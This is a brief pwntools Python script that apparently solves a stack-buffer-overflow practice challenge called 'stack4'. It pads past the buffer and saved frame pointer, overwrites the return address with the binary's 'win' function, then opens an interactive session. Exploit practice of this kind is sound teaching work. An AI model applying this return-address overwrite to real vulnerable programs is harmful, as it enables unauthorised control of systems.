from pwn import *

p = process('./stack4')
e = ELF('./stack4')

context.log_level = 'debug'

win = e.symbols['win']

payload = b'A' * 0x40
payload += b'B' * 0x8
payload += p64(win)

p.sendline(payload)

p.interactive()